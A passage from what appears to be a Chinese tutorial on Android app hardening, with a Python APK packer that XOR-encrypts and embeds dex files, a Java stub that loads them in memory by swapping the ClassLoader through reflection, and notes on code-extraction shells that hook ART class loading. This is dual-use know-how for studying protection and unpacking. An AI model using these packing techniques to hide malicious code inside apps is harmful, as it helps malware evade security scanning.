new_elem.set(f&#39;&#123;&#123;&#123;self.ns["android"]&#125;&#125;&#125;&#123;k&#125;&#39;, v)                return True        return False    # 不以壳manifest为基准操作则用不到该函数,以源apk的manifest为基准自带,无需额外设置    def getMainActivity(self):        activities = self.tree.findall(&#39;.//activity&#39;, namespaces=self.ns)        for activity in activities:            intent_filters = activity.findall(&#39;.//intent-filter&#39;, namespaces=self.ns)            for intent_filter in intent_filters:                action = intent_filter.find(&#39;.//action[@android:name=&quot;android.intent.action.MAIN&quot;]&#39;, namespaces=self.ns)                category = intent_filter.find(&#39;.//category[@android:name=&quot;android.intent.category.LAUNCHER&quot;]&#39;,                                              namespaces=self.ns)                if action is not None and category is not None:                    return activity.get(f&#39;&#123;&#123;&#123;self.ns["android"]&#125;&#125;&#125;name&#39;)        return None    def getApplication(self):        return self.getTagAttribute(&#39;application&#39;, &#39;name&#39;)    def setApplication(self, application: str):        self.setTagAttribute(&#39;application&#39;, &#39;name&#39;, application)    def addMetaData(self, name: str, value: str):        self.addTagWithAttributes(&#39;application&#39;, &#39;meta-data&#39;, &#123;&#39;name&#39;: name, &#39;value&#39;: value&#125;)    def getManifestData(self):        &quot;&quot;&quot;返回XML字符串&quot;&quot;&quot;        return etree.tostring(self.tree, pretty_print=True, encoding=&#39;utf-8&#39;, xml_declaration=True).decode()    def getEtractNativeLibs(self):        &quot;&quot;&quot;返回是否释放so文件&quot;&quot;&quot;        return self.getTagAttribute(&#39;application&#39;, &#39;extractNativeLibs&#39;)    def resetExtractNativeLibs(self):        &quot;&quot;&quot;重置etractNativeLibs属性为true&quot;&quot;&quot;        self.setTagAttribute(&#39;application&#39;, &#39;extractNativeLibs&#39;, &#39;true&#39;)# 合并壳dex和源apk的dexdef combineShellAndSourceDexs(shellApkTempDir: Path, srcApkTempDir: Path, newApkTempDir: Path):    def fixCheckSum(dexBytesArray):        # dexfile[8:12]        # 小端存储        value = adler32(bytes(dexBytesArray[12:]))        valueArray = bytearray(value.to_bytes(4, &#39;little&#39;))        for i in range(len(valueArray)):            dexBytesArray[8 + i] = valueArray[i]    def fixSignature(dexBytesArray):        # dexfile[12:32]        sha_1 = sha1()        sha_1.update(bytes(dexBytesArray[32:]))        value = sha_1.hexdigest()        valueArray = bytearray(unhexlify(value))        for i in range(len(valueArray)):            dexBytesArray[12 + i] = valueArray[i]    def fixFileSize(dexBytesArray, fileSize):        # dexfile[32:36]        # 小端存储        fileSizeArray = bytearray(fileSize.to_bytes(4, &quot;little&quot;))        for i in range(len(fileSizeArray)):            dexBytesArray[32 + i] = fileSizeArray[i]    def encrypto(file):        for i in range(len(file)):            file[i] ^= 0xff        return file    def readAndCombineDexs(unpackedApkDir: Path):        # 读取解包后的apk的所有dex文件,并合并为一个dex文件        combinedDex = bytearray()        # glob方法返回包含所有匹配文件的生成器        for dex in unpackedApkDir.glob(&#39;classes*.dex&#39;):            print(&#39;Source Apk Dex file:&#39;, dex)            with open(dex, &#39;rb&#39;) as f:                data = bytearray(f.read())                combinedDex += bytearray(len(data).to_bytes(4, &#39;little&#39;))  # dex文件的长度,小端序                combinedDex += data  # dex文件内容        return combinedDex    # 获取shelldex    with open(shellApkTempDir / &#39;classes.dex&#39;, &#39;rb&#39;) as f:        shellDexArray = bytearray(f.read())    # 获取源apk的dex文件    srcDexArray = readAndCombineDexs(srcApkTempDir)    # 新的dex文件长度    newDexLen = len(srcDexArray) + len(shellDexArray) + 4    # 加密源文件    encSrcDexArray = encrypto(srcDexArray)    # 新的dex文件内容 = 壳dex + 加密的源dex + 四字节标识加密后源dex大小长度    newDexArray = shellDexArray + encSrcDexArray + bytearray(len(encSrcDexArray).to_bytes(4, &#39;little&#39;))    # 修改filesize    fixFileSize(newDexArray, newDexLen)    # 修改signature    fixSignature(newDexArray)    # 修改checksum    fixCheckSum(newDexArray)    # 导出文件    with open(newApkTempDir / &#39;classes.dex&#39;, &#39;wb&#39;) as f:        f.write(newDexArray)# 提取源apk的Manifest文件,修改application为壳application(可能添加meta-data标签),输出新的Manifest文件def handleManifest(srcApkTempDir: Path, shellApkTempDir: Path, newApkTempDir: Path):    # 从源apk提取AndroidManifest.xml    with open(srcApkTempDir / &#39;AndroidManifest.xml&#39;, &#39;r&#39;) as f:        srcManifestEditor = ManifestEditor(f.read().encode())    srcApplication = srcManifestEditor.getApplication()    srcExtractNativeLibs = srcManifestEditor.getEtractNativeLibs()    print(&#39;SourceApplication:&#39;, srcApplication)    print(&#39;SourceExtractNativeLibs:&#39;, srcExtractNativeLibs)    # 从壳apk提取AndroidManifest.xml    with open(shellApkTempDir / &#39;AndroidManifest.xml&#39;, &#39;r&#39;) as f:        shellManifestEditor = ManifestEditor(f.read().encode())    print(&#39;ShellApplication:&#39;, shellManifestEditor.getApplication())    # 修改源AndroidManifest.xml的application为壳的代理application    srcManifestEditor.setApplication(shellManifestEditor.getApplication())    # 写入meta-data标签 保存源apk的原始application    if srcApplication != None:        print(&#39;Source application:&#39;, srcApplication)        srcManifestEditor.addMetaData(&#39;APPLICATION_CLASS_NAME&#39;, srcApplication)    # 如果源apk的manifest中默认设置etractNativeLibs=false,则重置为true,确保释放lib文件    if srcExtractNativeLibs == &#39;false&#39;:        srcManifestEditor.resetExtractNativeLibs()    # 输出新的AndroidManifest.xml    with open(newApkTempDir / &#39;AndroidManifest.xml&#39;, &#39;w&#39;) as f:        f.write(srcManifestEditor.getManifestData())def start(paths: Paths):    apktool = Apktool()    # 1.分别解包源文件和壳文件到临时目录    print(&#39;Extracting source and shell apk...&#39;)    apktool.extractApk(paths.srcApkPath, paths.srcApkTempDir)    print(&#39;Extract source apk success!&#39;)    print(&#39;Extracting shell apk...&#39;)    apktool.extractApk(paths.shellApkPath, paths.shellApkTempDir)    print(&#39;Extract shell apk success!&#39;)    # 2.复制源apk所有文件到新apk临时目录中,忽略源dex和manifest文件    print(&#39;Copying source apk files to new apk temp dir...&#39;)    shutil.copytree(paths.srcApkTempDir, paths.newApkTempDir,                    ignore=shutil.ignore_patterns(&#39;AndroidManifest.xml&#39;, &#39;classes*.dex&#39;))    print(&#39;Copy source apk files success!&#39;)    # 3.处理AndroidManifest.xml    print(&#39;Handling AndroidManifest.xml...&#39;)    handleManifest(paths.srcApkTempDir, paths.shellApkTempDir, paths.newApkTempDir)    print(&#39;Handle AndroidManifest.xml success!&#39;)    # 4.合并壳dex和源apk并导出文件    print(&#39;Combining shell dex and source dexs...&#39;)    combineShellAndSourceDexs(paths.shellApkTempDir, paths.srcApkTempDir, paths.newApkTempDir)    print(&#39;Combine shell dex and source dexs success!&#39;)    # 5.重打包apk    print(&#39;Repacking apk...&#39;)    apktool.repackApk(paths.newApkTempDir, paths.newApkPath)    print(&#39;Repack apk success!&#39;)    # 6.签名apk    print(&#39;Signing apk...&#39;)    apktool.signApk(paths.newApkPath)    print(&#39;Resign apk success!&#39;)    # 7.删除临时目录    print(&#39;Deleting temp directories...&#39;)    shutil.rmtree(paths.tmpdir)  # 删除临时目录    print(&#39;Delete temp directories success!&#39;)def main():    parser = argparse.ArgumentParser(description=&quot;Android APK Packer&quot;)    parser.add_argument(&#39;-src&#39;, &#39;--src-apk&#39;, required=True, type=Path, help=&#39;Path to source APK file&#39;)    parser.add_argument(&#39;-shell&#39;, &#39;--shell-apk&#39;, required=True, type=Path, help=&#39;Path to shell APK file&#39;)    parser.add_argument(&#39;-o&#39;, &#39;-out&#39;, &#39;--output-apk&#39;, type=Path,                        help=&#39;Output path for packed APK (Default: ./out/&lt;src-apk&gt;_protected.apk)&#39;)    args = parser.parse_args()    if args.output_apk == None:        args.output_apk = Path(&#39;./out&#39;) / (args.src_apk.stem + &#39;_protected.apk&#39;)  # 默认新apk名称及输出路径    paths = Paths(args.src_apk, args.shell_apk, args.output_apk)    print(&#39;Source APK:&#39;, paths.srcApkPath)    print(&#39;Shell APK:&#39;, paths.shellApkPath)    print(&#39;Output APK:&#39;, paths.newApkPath)    start(paths)if __name__ == &quot;__main__&quot;:    main()</code></pre><h5 id="脱壳程序-1"><a href="#脱壳程序-1" class="headerlink" title="脱壳程序"></a>脱壳程序</h5><p>SecondProxyApplication.java 相比 FirstProxyApplication.java改动如下：</p><ol><li>attachBaseContext。读取壳 dex 文件后，提取源程序 dex 文件,之后替换 ClassLoader，没有设置私有目录和释放文件等操作。</li><li>extractDexFilesFromShellDex。替代<strong>splitSourceApkFromShellDex</strong>，从壳 dex 提取源程序dex 文件并存储为 ByteBuffer[]。</li><li>replaceClassLoader。一代加固使用 DexClassLoader 从文件加载，二代加固使用 InMemoryDexClassLoader。</li></ol><p><strong>注意</strong>：</p><ul><li>在 Android 8.0 以下不支持 InMemoryDexClassLoader，需要手动实现；</li><li>在 Android 10.0 以下不支持 InMemoryDexClassLoader 指定 lib 目录的重载；默认搜索路径为<strong>nativeLibraryDirectories&#x3D;[&#x2F;system&#x2F;lib64, &#x2F;product&#x2F;lib64]]]</strong>。</li></ul><p>​        可参考以下文章修复 lib 目录的问题：<br><a href="https://blog.csdn.net/q610098308/article/details/105246355">https://blog.csdn.net/q610098308/article/details/105246355</a></p><p><a href="http://www.yxhuang.com/2020/03/28/android-so-load/">http://www.yxhuang.com/2020/03/28/android-so-load/</a></p><ul><li>若源程序设置了 android:extractNativeLibs&#x3D;”false”，则不会释放 lib 文件到文件系统，而是直接映射 APK 文件的 lib 数据。如果遇到这种情况则需要手动处理，模拟映射加载 so 的操作，背后的逻辑比较复杂，并且需要考虑兼容性。为了简化处理可以将加壳后 APK 的 <strong>android:extractNativeLibs</strong> 属性改为 true，强行指定释放 lib。</li></ul><pre><code class="language-Java">package com.example.androidshell2;import android.app.Application;import android.app.Instrumentation;import android.content.Context;import android.content.pm.ApplicationInfo;import android.content.pm.PackageManager;import android.os.Build;import android.os.Bundle;import android.util.ArrayMap;import android.util.Log;import java.io.BufferedInputStream;import java.io.ByteArrayOutputStream;import java.io.FileInputStream;import java.io.IOException;import java.lang.ref.WeakReference;import java.nio.ByteBuffer;import java.nio.ByteOrder;import java.util.ArrayList;import java.util.Iterator;import java.util.zip.ZipEntry;import java.util.zip.ZipInputStream;import dalvik.system.InMemoryDexClassLoader;public class SecondProxyApplication extends Application &#123;    private final String TAG=&quot;NshIdE&quot;;    public void log(String message)&#123;Log.d(TAG,message);&#125;    @Override    protected void attachBaseContext(Context base) &#123;        super.attachBaseContext(base);        log(&quot;SecondProxyApplication.attachBaseContext is running!&quot;);        try &#123;            byte[] shellDexData = readDexFromApk();            log(&quot;成功从源APK中读取classes.dex&quot;);            //从中分理出源dex文件            ByteBuffer[] byteBuffers = extractDexFilesFromShellDex(shellDexData);            log(&quot;成功分离出源dex集合&quot;);            //配置加载源程序的动态环境,即替换mClassLoader            replaceClassLoader(byteBuffers);        &#125; catch (Exception e) &#123;            log( Log.getStackTraceString(e));        &#125;    &#125;    @Override    public void onCreate() &#123;        super.onCreate();        log(&quot;SecondProxyApplication.onCreate is running!&quot;);        if(replaceApplication())            log(&quot;替换Application成功&quot;);    &#125;    // 从壳dex文件中提取源apk的dex并封装为ByteBuffer    private ByteBuffer[] extractDexFilesFromShellDex(byte[] shellDexData) throws IOException &#123;        int shellDexlength = shellDexData.length;        //开始解析dex文件        byte[] sourceDexsSizeByte = new byte[4];        //读取源dexs的大小        System.arraycopy(shellDexData,shellDexlength - 4, sourceDexsSizeByte,0,4);        //转成bytebuffer,方便4byte转int        ByteBuffer wrap = ByteBuffer.wrap(sourceDexsSizeByte);        //将byte转成int, 加壳时,长度按小端存储        int sourceDexsSizeInt = wrap.order(ByteOrder.LITTLE_ENDIAN).getInt();        Log.d(TAG, &quot;源dex集合的大小: &quot; + sourceDexsSizeInt);        //读取源dexs        byte[] sourceDexsData = new byte[sourceDexsSizeInt];        System.arraycopy(shellDexData,shellDexlength - sourceDexsSizeInt - 4, sourceDexsData, 0, sourceDexsSizeInt);        //解密源dexs        sourceDexsData = decrypt(sourceDexsData);        //更新部分        //从源dexs中分离dex        ArrayList&lt;byte[]&gt; sourceDexList = new ArrayList&lt;&gt;();        int pos = 0;        while(pos &lt; sourceDexsSizeInt)&#123;            //先提取四个字节,描述当前dex的大小            //开始解析dex文件            byte[] singleDexSizeByte = new byte[4];            //读取源dexs的大小            System.arraycopy(sourceDexsData, pos, singleDexSizeByte,0,4);            //转成bytebuffer,方便4byte转int            ByteBuffer singleDexwrap = ByteBuffer.wrap(singleDexSizeByte);            int singleDexSizeInt = singleDexwrap.order(ByteOrder.LITTLE_ENDIAN).getInt();            Log.d(TAG, &quot;当前singleDex的大小: &quot; + singleDexSizeInt);            //读取单独dex            byte[] singleDexData = new byte[singleDexSizeInt];            System.arraycopy(sourceDexsData,pos + 4, singleDexData, 0, singleDexSizeInt);            //加入到dexlist中            sourceDexList.add(singleDexData);            //更新pos            pos += 4 + singleDexSizeInt;        &#125;        //将dexlist包装成ByteBuffer        int dexNum = sourceDexList.size();        Log.d(TAG, &quot;源dex的数量: &quot; + dexNum);        ByteBuffer[] dexBuffers = new ByteBuffer[dexNum];        for (int i = 0; i &lt; dexNum; i++)&#123;            dexBuffers[i] = ByteBuffer.wrap(sourceDexList.get(i));        &#125;        return dexBuffers;    &#125;    // 从apk读取dex文件并返回dex对应字节数组    // 从当前程序的apk读取dex文件并存储为字节数组    private byte[] readDexFromApk() throws IOException &#123;        //1.获取当前应用程序的源码路径(apk),一般是data/app目录下,该目录用于存放用户安装的软件        String sourceDir = this.getApplicationInfo().sourceDir;        log(&quot;this.getApplicationInfo().sourceDir: &quot; +sourceDir);        //2.创建相关输入流        FileInputStream fileInputStream = new FileInputStream(sourceDir);        BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream);        ZipInputStream zipInputStream = new ZipInputStream(bufferedInputStream); //用于解析apk文件        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); //用于存放dex文件        //3.遍历apk的所有文件并提取dex文件        ZipEntry zipEntry;        while((zipEntry = zipInputStream.getNextEntry()) != null)&#123; //存在下一个文件            // 将classes.dex文件存储到bytearray中 壳dex和源apk合并后只保留一个dex便于处理            if (zipEntry.getName().equals(&quot;classes.dex&quot;))&#123;                byte[] bytes = new byte[1024];                int num;                while((num = zipInputStream.read(bytes))!=-1)&#123;      //每次读取1024byte,返回读取到的byte数                    byteArrayOutputStream.write(bytes,0, num); //存放到开辟的byteArrayOutputStream中                &#125;            &#125;            zipInputStream.closeEntry(); //关闭当前文件        &#125;        zipInputStream.close();        log(&quot;Read dex from apk succeed!&quot;);        return byteArrayOutputStream.toByteArray(); //将读取到的dex文件以字节数组形式返回    &#125;    private byte[] decrypt(byte[] sourceApkdata) &#123;        for (int i = 0; i &lt; sourceApkdata.length; i++)&#123;            sourceApkdata[i] ^= (byte) 0xff;        &#125;        return sourceApkdata;    &#125;    //替换壳程序LoadedApk的Application为源程序Application,并调用其onCreate方法    public boolean replaceApplication()&#123;        // Application实例存在于: LoadedApk.mApplication        // 以及ActivityThread的mInitialApplication和mAllApplications和mBoundApplication        //判断源程序是否使用自定义Application 若使用则需要进行替换,若未使用则直接返回,使用壳的默认Application即可        String appClassName = null; //源程序的Application类名        try &#123;            //获取AndroidManifest.xml 文件中的 &lt;meta-data&gt; 元素            ApplicationInfo applicationInfo = getPackageManager().getApplicationInfo(this.getPackageName(), PackageManager.GET_META_DATA);            Bundle metaData = applicationInfo.metaData;            //获取xml文件声明的Application类            if (metaData != null &amp;&amp; metaData.containsKey(&quot;APPLICATION_CLASS_NAME&quot;))&#123;                appClassName = metaData.getString(&quot;APPLICATION_CLASS_NAME&quot;);            &#125; else &#123;                log(&quot;源程序中没有自定义Application&quot;);                return false; //如果不存在直接返回,使用壳的application即可            &#125;        &#125; catch (PackageManager.NameNotFoundException e) &#123;            log(Log.getStackTraceString(e));        &#125;        //源程序存在自定义application类,开始替换        log(&quot;Try to replace Application&quot;);        //1.反射获取ActivityThread实例        Object sCurrentActivityThreadObj = Reflection.getStaticField(&quot;android.app.ActivityThread&quot;,&quot;sCurrentActivityThread&quot;);        log(&quot;ActivityThread: &quot; + sCurrentActivityThreadObj.toString());        //2.获取并设置LoadedApk        //获取mBoundApplication (AppBindData对象)        Object mBoundApplicationObj = Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mBoundApplication&quot;) ;        log(&quot;mBoundApplication: &quot;+mBoundApplicationObj.toString());        //获取mBoundApplication.info (即LoadedApk)        Object infoObj = Reflection.getField(&quot;android.app.ActivityThread$AppBindData&quot;,mBoundApplicationObj,&quot;info&quot;);        log( &quot;LoadedApk: &quot; + infoObj.toString());        //把LoadedApk的mApplication设置为null,这样后续才能调用makeApplication() 否则由于已存在Application,无法进行替换        Reflection.setField(&quot;android.app.LoadedApk&quot;,&quot;mApplication&quot;,infoObj,null);        //3.获取ActivityThread.mInitialApplication 即拿到旧的Application(对于要加载的Application来讲)        Object mInitialApplicationObj = Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mInitialApplication&quot;);        log(&quot;mInitialApplicationObj: &quot; + mInitialApplicationObj.toString());        //4.获取ActivityThread.mAllApplications并删除旧的application        ArrayList&lt;Application&gt; mAllApplicationsObj = (ArrayList&lt;Application&gt;) Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mAllApplications&quot;);        mAllApplicationsObj.remove(mInitialApplicationObj);        log(&quot;mInitialApplication 从 mAllApplications 中移除成功&quot;);        //5.重置相关类的Application类名 便于后续创建Application        //获取LoadedApk.mApplicationInfo        ApplicationInfo applicationInfo = (ApplicationInfo) Reflection.getField(&quot;android.app.LoadedApk&quot;,infoObj,&quot;mApplicationInfo&quot;);        log( &quot;LoadedApk.mApplicationInfo: &quot; + applicationInfo.toString());        //获取mBoundApplication.appInfo        ApplicationInfo appinfoInAppBindData = (ApplicationInfo) Reflection.getField(&quot;android.app.ActivityThread$AppBindData&quot;,mBoundApplicationObj,&quot;appInfo&quot;);        log(&quot;ActivityThread.mBoundApplication.appInfo: &quot; + appinfoInAppBindData.toString());        //此处通过引用修改值,虽然后续没有使用,但是实际上是修改其指向的LoadedApk相关字段的值        //设置两个appinfo的classname为源程序的application类名,以便后续调用makeApplication()创建源程序的application        applicationInfo.className = appClassName;        appinfoInAppBindData.className = appClassName;        log(&quot;Source Application name: &quot; + appClassName);        //6.反射调用makeApplication方法创建源程序的application        Application application = (Application) Reflection.invokeMethod(&quot;android.app.LoadedApk&quot;,&quot;makeApplication&quot;,infoObj,new Class[]&#123;boolean.class, Instrumentation.class&#125;,new Object[]&#123;false,null&#125;); //使用源程序中的application        //Application app = (Application)ReflectionMethods.invokeMethod(&quot;android.app.LoadedApk&quot;,&quot;makeApplication&quot;,infoObj,new Class[]&#123;boolean.class, Instrumentation.class&#125;,new Object[]&#123;true,null&#125;); //使用自定义的application 强制为系统默认        log(&quot;Create source Application succeed: &quot;+application);        //7.重置ActivityThread.mInitialApplication为新的Application        Reflection.setField(&quot;android.app.ActivityThread&quot;,&quot;mInitialApplication&quot;,sCurrentActivityThreadObj,application);        log(&quot;Reset ActivityThread.mInitialApplication by new Application succeed!&quot;);        //8.ContentProvider会持有代理的Application,需要特殊处理一下        ArrayMap mProviderMap = (ArrayMap) Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mProviderMap&quot;);        log(&quot;ActivityThread.mProviderMap: &quot; + mProviderMap);        //获取所有provider,装进迭代器中遍历        Iterator iterator = mProviderMap.values().iterator();        while(iterator.hasNext())&#123;            Object providerClientRecord = iterator.next();            //获取ProviderClientRecord.mLocalProvider,可能为空            Object mLocalProvider = Reflection.getField(&quot;android.app.ActivityThread$ProviderClientRecord&quot;,providerClientRecord,&quot;mLocalProvider&quot;) ;            if(mLocalProvider != null)&#123;                log(&quot;ProviderClientRecord.mLocalProvider: &quot; + mLocalProvider);                //获取ContentProvider中的mContext字段,设置为新的Application                Reflection.setField(&quot;android.content.ContentProvider&quot;,&quot;mContext&quot;,mLocalProvider,application);            &#125;        &#125;        log( &quot;Run Application.onCreate&quot; );        application.onCreate(); //源程序,启动!        return true;    &#125;    // 替换壳App的ClassLoader为源App的ClassLoader    private void replaceClassLoader(ByteBuffer[] byteBuffers) throws Exception&#123;        //1.获取当前的classloader        ClassLoader classLoader = this.getClassLoader();        log(&quot;Current ClassLoader: &quot; + classLoader.toString());        log(&quot;Parent ClassLoader: &quot; + classLoader.getParent().toString());        //2.反射获取ActivityThread        Object sCurrentActivityThreadObj = Reflection.getStaticField(&quot;android.app.ActivityThread&quot;,&quot;sCurrentActivityThread&quot;);        log(&quot;ActivityThread.sCurrentActivity: &quot; + sCurrentActivityThreadObj.toString());        //3.反射获取LoadedApk        //获取当前ActivityThread实例的mPackages字段 类型为ArrayMap&lt;String, WeakReference&lt;LoadedApk&gt;&gt;, 里面存放了当前应用的LoadedApk对象        ArrayMap mPackagesObj = (ArrayMap) Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mPackages&quot;);        log( &quot;mPackagesObj: &quot; + mPackagesObj.toString());        //获取mPackages中的当前应用包名        String currentPackageName = this.getPackageName();        log(&quot;currentPackageName: &quot; + currentPackageName);        // 获取loadedApk实例也有好几种,mInitialApplication mAllApplications mPackages        // 通过包名获取当前应用的loadedApk实例        WeakReference weakReference = (WeakReference) mPackagesObj.get(currentPackageName);        Object loadedApkObj = weakReference.get();        log( &quot;LoadedApk: &quot; + loadedApkObj.toString());        //动态加载源程序的dex文件        if(Build.VERSION.SDK_INT&gt;=29)&#123;            Log.d(TAG,&quot;Library path:&quot;+this.getApplicationInfo().nativeLibraryDir);            InMemoryDexClassLoader dexClassLoader=new InMemoryDexClassLoader(byteBuffers,this.getApplicationInfo().nativeLibraryDir,classLoader.getParent());            Log.d(TAG, &quot;New InMemoryDexClassLoader: &quot; + dexClassLoader);            //替换当前loadedApk实例中的mClassLoader字段            Reflection.setField(&quot;android.app.LoadedApk&quot;,&quot;mClassLoader&quot;,loadedApkObj,dexClassLoader);        &#125;        else&#123;            Log.d(TAG,&quot;不支持Android 8.0以下版本&quot;);        &#125;    &#125;&#125;</code></pre><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>​        二代加固使用不落地加载技术，可在内存中直接加载dex，实际上是对落地加载的更新。</p><p>​        第一代和第二代加固统称为整体加固，在部分资料中将他们合称为一代加固，将代码抽取加固称为二代加固。</p><ul><li>优点：相对一代加固更加高效，不容易从文件系统获取 dex 文件从而得到关键代码；</li><li>缺点：兼容性问题: 源程序的libso处理起来比较复杂；低版本需要手动实现InMemoryDexClassLoader。</li></ul><p>​        当然，总的来说，整体加固现在都能一把梭，用 frida-dexdump。</p><h3 id="三、第三代壳-抽取加固"><a href="#三、第三代壳-抽取加固" class="headerlink" title="三、第三代壳-抽取加固"></a>三、第三代壳-抽取加固</h3><p>​        基于整体加固遇到的部分问题，引申出了第三代加固——代码抽取加固。</p><p>​        思路：将关键方法的指令抽空，替换为 nop 指令，运行时动态回填指令执行，回填的核心是对 Android 系统核心函数进行 hook。</p><ol><li>Hook 点<ul><li>常用的 Hook 点有 <strong>ClassLinker::LoadMethod</strong> 和 <strong>ClassLinker:DefineClass</strong>，二者都可以获取 DexFile 对象；</li><li>LoadMethod：可获取 Method 对象，从而获取 codeOff，方便回填处理，但兼容性差；</li><li>DefineClass：可获取 ClassDef 对象，需要解析得到 codeOff，更复杂但兼容性更好，变化不大。</li></ul></li><li>如何抽取代码（可参考这篇<a href="https://bbs.kanxue.com/thread-284995.htm">文章</a>中的 Dex 文件结构和代码抽取部分）<ul><li>Dex 文件结构中的 <strong>DexClassDef</strong> 结构定义了各个类的信息，其中的 <strong>DexClassData</strong> 结构记录了类的 <strong>字段</strong> 和 <strong>方法数据</strong>；</li><li>方法由 <strong>DexMethod</strong> 结构保存，其 codeOff 成员保存了方法的字节码数据在文件中的偏移，根据该偏移可以进行抽取。</li></ul></li></ol><p><strong>LoadMethod</strong> 声明如下</p><pre><code class="language-c++">//Android 7及以前  void LoadMethod(Thread* self,                  const DexFile&amp; dex_file,                  const ClassDataItemIterator&amp; it,                  Handle&lt;mirror::Class&gt; klass, ArtMethod* dst)//Android 8-9  void LoadMethod(const DexFile&amp; dex_file,                  const ClassDataItemIterator&amp; it,                  Handle&lt;mirror::Class&gt; klass, ArtMethod* dst)//Android 10-14    void LoadMethod(const DexFile&amp; dex_file,                  const ClassAccessor::Method&amp; method,                  Handle&lt;mirror::Class&gt; klass,                  ArtMethod* dst)     //Android 15  void LoadMethod(const DexFile&amp; dex_file,                  const ClassAccessor::Method&amp; method,                  ObjPtr&lt;mirror::Class&gt; klass,                  /*inout*/ MethodAnnotationsIterator* mai,                  /*out*/ ArtMethod* dst)</code></pre><p><strong>DefineClass</strong> 声明如下</p><pre><code class="language-c++">// Android 5.0 Level 21 及之前使用该声明static void* (*g_originDefineClassV21)(void* thiz,                                       const char* descriptor,                                       void* class_loader,                                       const void* dex_file,                                       const void* dex_class_def);/*//原始声明mirror::Class* DefineClass(const char* descriptor,                            Handle&lt;mirror::ClassLoader&gt; class_loader,                            const DexFile&amp; dex_file,                            const DexFile::ClassDef&amp; dex_class_def)*/ // Android 5.1-14 Level22-34使用该声明static void* (*g_originDefineClassV22)(void* thiz,                                       void* self,                                       const char* descriptor,                                       size_t hash,                                       void* class_loader,                                       const void* dex_file,                                       const void* dex_class_def);/*//原始声明ObjPtr&lt;mirror::Class&gt; DefineClass(Thread* self,                                  const char* descriptor,                                  size_t hash,                                  Handle&lt;mirror::ClassLoader&gt; class_loader,                                  const DexFile&amp; dex_file,                                  const dex::ClassDef&amp; dex_class_def)*/ //Android 15 Level 35 以后使用该声明static void* (*g_originDefineClassV35)(void* thiz,                                       void* self,                                       const char* descriptor,                                       size_t descriptor_length,                                       size_t hash,                                       void* class_loader,                                       const void* dex_file,                                       const void* dex_class_def);//原始声明/*ObjPtr&lt;mirror::Class&gt; DefineClass(Thread* self,                                  const char* descriptor,                                  size_t descriptor_length,                                  size_t hash,                                  Handle&lt;mirror::ClassLoader&gt; class_loader,                                  const DexFile&amp; dex_file,                                  const dex::ClassDef&amp; dex_class_def)*/</code></pre><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><h5 id="源程序3"><a href="#源程序3" class="headerlink" title="源程序3"></a>源程序3</h5><p>主要包括 3 个技术点（同上）：</p><ol><li>Native 层 NDK 开发；</li><li>Multidex</li><li>自定义 Application</li></ol><hr><h5 id="加壳程序-2"><a href="#加壳程序-2" class="headerlink" title="加壳程序"></a>加壳程序</h5><p>加壳程序主要分为三个模块</p><ol><li>APK 处理模块：提供解包 APK、打包 APK、签名 APK 的功能；</li><li>XML 处理模块：提供读取标签、修改标签、添加标签的功能；</li><li>DEX 处理模块：提供合并多 Dex，加密 Dex，代码抽取、文件修复的功能。</li></ol><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250821160930725.png" alt="image-20250821160930725"></p><p>加壳程序工作基本流程图如下：<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250821161000396.png" alt="image-20250821161000396"></p><p>加壳程序工作流程总览图如下：<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250821161209038.png" alt="image-20250821161209038"></p><p>相对于 SecondShell.py 的改动如下：</p><ol><li>start<ul><li>解包原 APK 后 调用 extractAllDexFiles 抽取出所有 dex 文件的代码；</li><li>另外复制了壳 APK 的 lib 库到新 APK 的临时目录（hook 和代码回填逻辑在 native 层）；</li></ul></li><li>extractAllDexFiles<ul><li>遍历指定目录的所有 dex 文件，调用 ReadDex 抽取代码，得到对应的 .patched 和 .codes 文件；</li><li>修复 patch 后的 dex 文件并覆写原 dex 文件，将 codes 移动到 assets 目录下。</li></ul></li></ol><pre><code class="language-python">from zlib import adler32from hashlib import sha1from binascii import unhexlifyfrom lxml import etreeimport subprocessimport shutilfrom pathlib import Pathimport argparse# Paths类,管理全局用到的路径class Paths:    def __init__(self, srcApk: Path, shellApk: Path, outputApk: Path):        # 相关APK文件路径        self.srcApkPath = srcApk.resolve()  # 解析为绝对路径        self.shellApkPath = shellApk.resolve()        self.newApkPath = outputApk.resolve()        # 临时目录 以该脚本文件父目录为根目录        self.tmpdir = Path(__file__).parent / &#39;temp&#39;        self.srcApkTempDir = self.tmpdir / &#39;srcApkTemp&#39;        self.shellApkTempDir = self.tmpdir / &#39;shellApkTemp&#39;        self.newApkTempDir = self.tmpdir / &#39;newApkTemp&#39;# Apktool类,通过subprocess调用其他工具 提供解包,打包,签名,抽取代码功能class Apktool:    def __init__(self):        self.apktool_path = Path(__file__).parent.parent / &#39;tools/apktool/apktool.bat&#39;        self.signer_path = Path(__file__).parent / &#39;tools/uber-apk-signer-1.3.0.jar&#39;        self.readDex_path = Path(__file__).parent / &#39;tools/ReadDex.exe&#39;    # 为apk签名    def signApk(self, unsignedApkPath: Path):        self.runCommand([&#39;java&#39;, &#39;-jar&#39;, self.signer_path, &#39;--apk&#39;, unsignedApkPath])    # 使用apktool解包apk 只解包资源得到AndroidManifest.xml 不需要解包dex文件得到smali    def unpackApk(self, apkPath: Path, outputDir: Path):        self.runCommand([self.apktool_path, &#39;d&#39;, apkPath, &#39;-s&#39;, &#39;-o&#39;, outputDir])    # 重打包apk    def repackApk(self, inputDir: Path, outApk: Path):        self.runCommand([self.apktool_path, &#39;b&#39;, inputDir, &#39;-o&#39;, outApk])    # 抽取指定dex文件的代码    def extractDexCodes(self, dexPath: Path):        # 调用ReadDex.exe抽取dex文件代码,输出到同级目录 例如classes.dex抽取后生成classes.dex.patched和classes.dex.codes        self.runCommand([self.readDex_path, 